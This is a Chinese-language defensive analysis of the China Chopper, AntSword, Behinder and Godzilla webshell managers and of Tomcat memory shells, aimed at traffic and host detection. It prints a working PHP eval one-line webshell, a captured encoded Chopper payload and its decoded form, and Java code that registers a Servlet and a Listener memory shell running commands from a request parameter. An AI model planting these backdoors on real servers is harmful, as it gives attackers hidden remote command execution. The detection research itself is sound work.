> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9397)

前言
--

在网络安全实战攻防演练中，只有了解攻击方的攻击思路和运用武器，防守方才能有效应对。以 WebShell 为例，由于企业对外提供服务的应用通常以 Web 形式呈现，因此 Web 站点经常成为攻击者的攻击目标。攻击者找到 Web 站点可利用的漏洞后，通常会在 Web 站点植入 WebShell 程序，从而实现对目标站点的控制。为了躲避防守方的检测，攻击方加密 WebShell 成为常态，由于流量加密，传统的 WAF、WebIDS 设备难以检测，给防守方监控带来巨大的挑战。因此，防守方需要了解攻击方使用的加密武器，才能找到相应的破解方式。

**本文将通过分析目前攻击方常用的四大主流 WebShell 管理工具：中国菜刀、中国蚁剑、冰蝎 Shell 管理工具、哥斯拉 Shell 管理工具，探讨其加密特征，为防守方提供一些新的检测思路 ****。**

中国菜刀
----

中国菜刀（Chopper）是一款经典的网站管理工具，具有文件管理、数据库管理、虚拟终端等功能。

### 服务端

```
<?php eval($_POST["Sp4ar"]);?>
```

其中‍Sp4ar 是连接密码，可以随意更改。也可对服务端做一些混淆操作，防止被查杀。

### 配置

```
<T>类型</T> 类型可为MYSQL,MSSQL,ORACLE,INFOMIX中的一种
<H>主机地址<H> 主机地址可为机器名或IP地址，如localhost
<U>数据库用户</U> 连接数据库的用户名，如root
<P>数据库密码</P> 连接数据库的密码，如123456
<L>编码类型</L> utf8,gbk等数据编码类型
ASP和ASP.NET脚本：
<T>类型</T> 类型只能填ADO
<C>ADO配置信息</C>
ADO连接各种数据库的方式不一样。如MSSQL的配置信息为
Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=123456
在设置好配置之后可以对网站数据库，文件等进行管理。
```

在设置好配置之后可以对网站数据库，文件等进行管理。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231148-121e663c-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231148-121e663c-9a0f-1.jpg)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231149-12907844-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231149-12907844-9a0f-1.jpg)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231149-12dfb026-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231149-12dfb026-9a0f-1.jpg)

### **通信流量**

```
POST /u.php HTTP/1.1
X-Forwarded-For: 1*.***.*.***
Referer: http://1*.***.*.***
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: 1*.***.*.***
Content-Length: 690
Connection: Close
Cache-Control: no-cache
Cookie: PHPSESSID=m4mi07jn4u6cd3gmhdt97fmq55

Sp4ar=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D
```

### （1）请求侧

#### 从 payload 中可以看出，eval 后面卡了一个 %01 的字符，这样的语法在高版本的 php 中无法执行，低版本抛出 warning 后正常执行。获取 z0 的值并进行 base64 解码之后传入 eval 执行，z0 解码之后的内容为：

```
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\t";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;;echo("|<-");die();
```

**（2）响应侧**

从请求侧的代码来看，执行结果会被包裹在 ->| |<- 中，抓包查看：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231149-13042956-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231149-13042956-9a0f-1.jpg)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231150-13630642-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231150-13630642-9a0f-1.jpg)可以发现执行结果确实是在 ->||<- 中。

### **检测**

文件检测：通过静态文件的方式进行 WebShell 查杀。

流量检测：通过检测通信中的 eval，base64_decode 等关键字。

中国蚁剑
----

中国蚁剑与中国菜刀相比，界面更加美观、功能更加齐全，并且自定义的程度更高且开放源代码。

### **服务端**

中国蚁剑的服务端会根据不同编码器有所变化，但还是从最基础的开始分析：

```
<?php eval($_POST["Sp4ar"]);?> //pwd表示连接密码，可以随意更换
```

### **配置**

编辑 / 新增记录的时候可以自定义头部字段，选择编 / 解码器以及一些其他设置。中国蚁剑默认的 UA 头是 antSword/v 版本号，目前已经被很多安全产品标记，所以在配置的时候通常会更改，改 UA 头的方式有两种：一、添加 Shell 的时候在请求信息中添加 User-Agent 字段覆盖掉原始的值，二、在 modules/request.js 修改 USER_AGENT 的值。第一种方法只针对当前添加的记录生效，第二种方法针对所有的 shell 都生效。

中国蚁剑的编 / 解码器可以对请求 / 响应侧的流量进行编 / 解码以绕过流量检测，在最新版的中国蚁剑中 (v2.1.11) 默认的编码器有五个，解码器有三个。

**（1）编码器**

编码器是在发送数据到服务端之前对 payload 进行相关处理，目的是为了绕过请求侧的流量检测，默认的编码器：

*   default 编码器：不对传输的 payload 进行任何操作。
*   base64 编码器：对 payload 进行 base64 编码。
*   chr 编码器：对 payload 的所有字符都利用利用 chr 函数进行转换。
*   chr16 编码器：对 payload 的所有字符都利用 chr 函数转换，与 chr 编码器不同的是 chr16 编码器对 chr 函数传递的参数是十六进制。
*   rot13 编码器：对 payload 中的字母进行 rot13 转换。
*   以上五种编码为中国蚁剑自带的，不需要配置就可以直接使用，除此之外，还存在一个 RSA 编码器，该编码器将
*   RSA 编码器：该编码器默认不展示，需要自己配置。配置方法：在编码管理界面点击生成 RSA 配置生成公钥、私钥和 PHP 代码，然后点击新建编码器选择 PHP RSA 之后输入编码器的名字即可。

**（2）解码器**

解码器主要是对接收到的数据进相关处理，目的是为了绕过响应侧的流量检测，默认的解码器：

*   default 解码器：不对响应数据进行处理。
*   base64 解码器：将收到的数据进行 base64 解码。
*   rot13 解码器：将收到的数据进行 rot13 转换，由于英文字母一共 26 个所以置换两次之后会还原。

### 通信流量

**（1）请求侧**

针对不同编码器请求侧的流量有所不同

默认编码器发送的数据如下：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231150-138e05d6-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231150-138e05d6-9a0f-1.jpg)base64 编码器发送数据如下：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-13b74b76-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-13b74b76-9a0f-1.jpg)chr：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-13fa7aea-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-13fa7aea-9a0f-1.jpg)chr16：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-14398fe6-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-14398fe6-9a0f-1.jpg)rot13:

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-1461fa6c-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-1461fa6c-9a0f-1.jpg)rsa:

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-148de50a-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-148de50a-9a0f-1.jpg)**（2）响应侧**

采用不同解码器响应方向的数据也不同。

default：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-14ae1dac-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-14ae1dac-9a0f-1.jpg)base64：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-14cd88fe-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-14cd88fe-9a0f-1.jpg)rot13：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-14ee819e-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-14ee819e-9a0f-1.jpg)**检测**

1. 文件检测：通过静态文件的方式进行 WebShell 查杀

2. 流量检测：针对不同的编码器流量特征不相同。

针对前面 1.2.1 中的前五种编码器，可以检测关键字。

针对 rsa 编码器：由于数据完全加密所以无法使用关键字检测。仔细观察加密之后的数据可以知道：在长度足够的情况下，每相隔固定的长度就会出现一个 | 字符，分析编码器可知，加密时是先将原始的 payload 进行分段然后对每一个段进行加密并以 base64 的格式输出。在 rsa 加密算法中密文长度等于密钥长度，明文长度不超过密钥长度。由于 payload 长度比密文长很多所以在加密是必须切割，但是无论怎么切割加密之后的数据长度都是都是固定的，所以在检测的时候可以根据这一特性来进行检测。由于输出结果是 base64 编码的所以每一个段的数据的字符都是在 a-zA-Z0-9+=/ 之间，每一个段之间都有一个分隔符，当密钥长度是 1024 位的时候，每个段的明文长度是 172，该编码器默认生成的长度是 1024 且在前端无法更改，但是可以通过替换 antData 目录下的 key_rsa 和 key_rsa.pub 两个文件来更换密钥长度，这两个文件可以通过 openssl 生成。

生成方式如下：

1.  生成 rsa 私钥

```
openssl genrsa -out key_rsa 2048
```

1.  生成公钥

```
openssl rsa -in key_rsa -pubout -out key_rsa.pub
```

然后分别替换 key_rsa 和 key_rsa.pub 即可。替换之后可以发现每个分段的长度明显增加从之前的 172 变成 344，当密钥长度增加到 3072 时，分段长度增加到 512，同时加密所需时间明显增加。

**冰蝎 Shell 管理工具**
-----------------

冰蝎 Shell 管理工具是一款流行的、采用二进制动态加密传输数据的网站管理工具。

### **服务端**

相关链接:

《利用动态二进制加密实现新型一句话木马之 Java 篇》：

[https://xz.aliyun.com/t/2744](https://xz.aliyun.com/t/2744)

《利用动态二进制加密实现新型一句话木马之. NET 篇》：

[https://xz.aliyun.com/t/2758](https://xz.aliyun.com/t/2758)

《利用动态二进制加密实现新型一句话木马之 PHP 篇》：

[https://xz.aliyun.com/t/2774](https://xz.aliyun.com/t/2774)

### **配置**

目前冰蝎 Shell 管理工具的配置仅支持代理和自定义 HTTP 头部。

### **通信流量**

**（1）请求侧**

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-151d311a-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-151d311a-9a0f-1.jpg)

**（2）响应侧**

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-1543ba56-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-1543ba56-9a0f-1.jpg)**检测**

1. 文件检测：文件的特征主要在解密算法部分和执行 payload 的部分。

2. 流量检测：由于最新版冰蝎 Shell 管理工具这个交互过程都采用加密传输，无法采用检测关键字的方法进行检测。相比于 2.0 的版本，3.0 去除了协商密钥的过程，但这带来了一个问题就是，整个过程的密钥是不变的，同时分析冰蝎的源码可以发现：在传输 php，jsp，aspx 时前面的字段是固定的，这就导致了在一个 WebShell 中每一个流的前面的字节都是相同，php 前面是 assert|eval(base64_decode(、csharp 是 dll 文件的头部格式、java 则是 class 文件的头部格式。由于 asp（php 无法加载 openssl 时）采用异或对 payload 进行运算，根据异或的特征（两次异或即还原数据）可以使用密文以原始的 payload 的前十六位进行异或得到的就是密钥，再用密钥对整体数据进行解密即可还原出明文。

3. 异常进程检测：当冰蝎 Shell 管理工具执行命令是可以发现系统中会创建两个进程（父子关系）来执行命令。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-1569b6e8-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-1569b6e8-9a0f-1.jpg)

当启用虚拟终端时同样如此。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231154-159fe560-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231154-159fe560-9a0f-1.jpg)

哥斯拉 Shell 管理工具
--------------

哥斯拉 Shell 管理工具与冰蝎 Shell 管理工具类似，通信过程都是加密流量，工具界面如下：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231154-15bf0cc4-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231154-15bf0cc4-9a0f-1.jpg)

### **WebShell 连接**

作者已经内置了 Payload 以及加密器，以 JavaDynamicPayload 为例，我们生成一个 WebShell 查看代码。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231154-15dd94a0-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231154-15dd94a0-9a0f-1.jpg)

Unicode 解码后代码：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231155-161225a8-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231155-161225a8-9a0f-1.jpg)

字符串 xc 为自定义秘钥 (pass)MD5 的前 16 位。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231155-16349548-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231155-16349548-9a0f-1.jpg)

拼接自定义的密码和秘钥获取 md5 值， 这里的 md5 值作为认证密码和密钥, 主要代码逻辑如下：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231155-16633952-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231155-16633952-9a0f-1.jpg)

#### 抓取连接 Shell 地址过程数据包，一共进行了三次请求响应：[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231155-168b405a-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231155-168b405a-9a0f-1.jpg)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231156-16b17252-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231156-16b17252-9a0f-1.jpg)[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231156-16d21c50-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231156-16d21c50-9a0f-1.jpg)

JavaAesBase64 类初始化方法如下，加解密方法与生成的 WebShell 相对应：[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231156-1703c746-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231156-1703c746-9a0f-1.jpg)

### [![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231156-1730a86a-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231156-1730a86a-9a0f-1.jpg)

### **流量端检测思路**

围绕流量测的检测思路，因为其流量加密的特性，其实与冰蝎 Shell 管理工具想法大致相同，往往需要多种弱特征结合验证，如可以通过分析 Shell 连接过程的简单固有特征，结合数据统计分析来进行检测等。

### **内存马**

内存马特点：文件无需落地，更加隐蔽。以 tomcat 为例，内存马分为以下三种：Servlet、Filter、Listener

**（1）Servlet 内存马**

以一个简单的 Servletdemo 为例，访问 url，查看 tomcat 对应的调用栈如下：

#### [![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231157-17665a50-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231157-17665a50-9a0f-1.jpg)

我们知道通过 web.xml 或者注解的方式可以配置自定义的 servlet 与 url 的映射。而在 tomcat 中，Wrapper 等效于 Servlet，即我们只要自定义的实现该逻辑，就可实现 Servlet 内存马。

Servlet3.0 开始提供了动态注册 filter、Servlet、Listener，这里不再赘述，感兴趣的可以自己调试验证下，主要逻辑为：

创建自定义 Servlet

使用 Wrapper 对应进行封装

添加封装后的 Wrapper 到 StandardContext 的 children 当中

添加 ServletMapping 将访问的 URL 和 Servlet 进行绑定

如 234 步骤实现代码如下：

```
// 获取StandardContext
    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();


    // 用Wrapper对其进行封装
    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
    newWrapper.setName("sangfor");
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(servlet);
    newWrapper.setServletClass(servlet.getClass().getName());
    // 添加封装后的恶意Wrapper到StandardContext的children当中
    standardCtx.addChild(newWrapper);
    // 添加ServletMapping将访问的URL和Servlet进行绑定
    standardCtx.addServletMapping("/sangfor","sangfor");
```

**（3）Listener 内存马**

请求站点时，优先级如下，Listener -> Filter -> Servlet，Listener 是最先被加载的

当设置了 ServletRequestListener 时，每次请求都会先进入 Listener 进行逻辑判断

Listen 监视器分类：

ServletContext 监听, 服务启动和停止时触发

Session 监听, Session 初始化和销毁时触发

Request 监听, 访问服务时触发

我们需要通过 Request 这个点来实现，即 ServletRequestListener，主要逻辑：

自定义 Listener

调用 StandardContext 对象的 addApplicationEventListener 方法来添加 Listenner

（直接使用 ApplicationContext 的 addListenner 方法来动态添加 Listener 会进行 web 容器状态判断）

主要代码如下：

```
//listener
ServletRequestListener demoListener = new ServletRequestListener() {
 @Override
 public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
 }
 @Override
 public void requestInitialized(ServletRequestEvent sre) {
 System.out.println("requestInitialized");
 String cmd = sre.getServletRequest().getParameter("cmd");
 try{
 //获取sre中的requestFacade对象
 org.apache.catalina.connector.RequestFacade requestFacade =
(org.apache.catalina.connector.RequestFacade)sre.getServletRequest();


 //反射获取RequestFacade中的request对象
 java.lang.reflect.Field connrequestField =
org.apache.catalina.connector.RequestFacade.class.getDeclaredField("request");
 connrequestField.setAccessible(true);
 org.apache.catalina.connector.Request request =
(org.apache.catalina.connector.Request) connrequestField.get(requestFacade);
 //执行命令并回显
 String[] cmds =
!System.getProperty("os.name").toLowerCase().contains("win") ? new String[]
{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
 java.io.InputStream in =
Runtime.getRuntime().exec(cmds).getInputStream();
 java.util.Scanner s = new
java.util.Scanner(in).useDelimiter("\\a");
 String output = s.hasNext() ? s.next() : "";
 java.io.Writer writer = request.getResponse().getWriter();
 java.lang.reflect.Field usingWriter =
request.getResponse().getClass().getDeclaredField("usingWriter");
 usingWriter.setAccessible(true);
 usingWriter.set(request.getResponse(), Boolean.FALSE);
 writer.write(output);
 writer.flush();
 }catch (Exception e){
 e.printStackTrace();
 }
 }
};
//获取standardContext
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
(org.apache.catalina.loader.WebappClassLoaderBase)
Thread.currentThread().getContextClassLoader();
org.apache.catalina.core.StandardContext standardCtx =
(org.apache.catalina.core.StandardContext)webappClassLoaderBase.getResources().
getContext();
//添加监听器
standardCtx.addApplicationEventListener(demoListener);
```

**（4）哥斯拉 Shell 管理工具实现内存马**

我们再回过头来看下哥斯拉 Shell 管理工具中内存马的实现，内部实现了不同 webshell 的内存马，使用 jd-gui 工具打开 class 文件，可以看到，C 刀，冰蝎不同 shell 的实现逻辑大相径庭，根据其 shell 管理工具进行了修改：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231157-17943c86-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231157-17943c86-9a0f-1.jpg)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231157-17bfe174-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231157-17bfe174-9a0f-1.jpg)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210410231158-17ed9592-9a0f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210410231158-17ed9592-9a0f-1.jpg)

**（5）内存马检测**

有了其攻击手段的实现，防御检测思路也不断更新替换，上述也仅仅是 tomcat 的实现思路，不同容器框架的具体实现也需要对应的进行封装修改，但其思路大致相同。

万变不离其宗，在主机侧，我们可以通过以下维度是进行检测：

*   攻击行为固有行为特征
*   不同于正常业务的特殊共性
*   高危敏感行为检测

网上已有不少主机侧检测思路，如：

*   核心特点均会是被加载进 jvm 的类，即思路为遍历获取每个类，通过类黑名单、高危风险类筛选检测
*   内存马不落地，即本地不存在对应 class 文件，攻击者又会在内存马中放置危险操作这两个特性，检测对应 ClassLoader 目录文件是否存在 class 文件。我们再 dump 对应 class（如 filter）进行 check

我们也可以通过 RASP 技术注入监测阻断恶意敏感操作，也可以达到比较好的类隔离效果。

**总结**
------

安全本质上就是一个攻防对抗的过程，随着攻击方式的不断升级变形，防守再也在不是一成不变，固守单一防御检测手段，只会止步不前。而在 WebShell 检测领域，随着 WebShell 的更新迭代，流量测加密、更加隐蔽攻击手段已成为趋势，防守方不仅要在流量检测方面提升效果，在主机侧检测也需同步更新升级，相信在不久的未来，检测防御 WebShell 的技术也会更加成熟有效。

**参考链接**
--------

[https://www.freebuf.com/sectool/252840.html](https://www.freebuf.com/sectool/252840.html)

[http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/](http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/)

[https://my.oschina.net/u/4593189/blog/4805061](https://my.oschina.net/u/4593189/blog/4805061)

[https://github.com/feihong-cs/memShell](https://github.com/feihong-cs/memShell)

[https://gv7.me/articles/2020/kill-java-web-filter-memshell/](https://gv7.me/articles/2020/kill-java-web-filter-memshell/)

值得一提的是，**深信服结合大量实战案例分析，发布「二四二」网络安全攻防实战演练防守方案**，有效帮助用户提升网络安全防御能力，实现「始于演练，精于实战」。